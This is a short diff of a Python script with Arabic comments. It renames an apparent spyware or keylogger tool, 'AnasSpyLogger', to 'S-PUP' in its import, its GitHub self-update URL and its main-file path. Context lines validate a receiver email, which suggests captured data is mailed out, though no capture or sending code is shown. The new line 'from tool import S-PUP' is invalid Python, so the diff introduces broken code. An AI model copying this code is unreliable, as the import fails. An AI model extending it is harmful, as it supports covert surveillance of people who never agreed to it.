@@ -12,11 +12,11 @@
 
 import os
 import requests
-from tool import anasspylogger
+from tool import S-PUP
 
 # رابط التحديث المباشر للسكريبت
-update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"
-target_file = "tool/anasspylogger.py"  # الملف المستهدف للتحديث
+update_url = "https://raw.githubusercontent.com/anaslabrini/S-PUP/refs/heads/main/tool/S-PUP.py"
+target_file = "tool/S-PUP.py"  # الملف المستهدف للتحديث
 
 
 def clear_screen():
@@ -92,7 +92,7 @@ try:
         raise ValueError("[-] Invalid receiver email.")
 
     # الملف الرئيسي للسكربت
-    input_file = "tool/anasspylogger.py"
+    input_file = "tool/S-PUP.py"
 
     with open(input_file, "r") as file:
         content = file.read()
